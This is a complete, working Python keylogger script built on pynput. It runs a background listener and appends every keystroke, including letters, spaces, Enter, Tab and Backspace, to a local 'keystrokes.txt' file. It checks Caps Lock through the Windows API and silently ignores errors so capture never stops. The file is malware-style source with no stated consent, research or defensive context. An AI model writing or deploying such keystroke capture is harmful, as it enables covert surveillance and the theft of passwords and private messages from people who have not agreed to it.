import os
import ctypes
from pynput import keyboard

# Save the log file in the same folder as the script
log_path = os.path.join(os.path.dirname(__file__), "keystrokes.txt")

def is_caps_lock_on():
    # Hardware check for Caps Lock state
    return ctypes.windll.user32.GetKeyState(0x14) & 1

def on_press(key):
    try:
        # Handle regular letters, numbers, and symbols
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            # Force uppercase if Caps Lock is hardware-active
            if is_caps_lock_on() and char.isalpha():
                char = char.upper()
            write_to_file(char)
            
        # FORCE FIX FOR SPACE: If the key is the spacebar
        elif key == keyboard.Key.space:
            write_to_file(" ")
            
        # Handle other special keys
        else:
            special_map = {
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: "[BKSP]"
            }
            if key in special_map:
                write_to_file(special_map[key])
                
    except Exception as e:
        # Prevent the script from crashing if an error occurs
        pass

def write_to_file(text):
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(text)

# Start the background listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()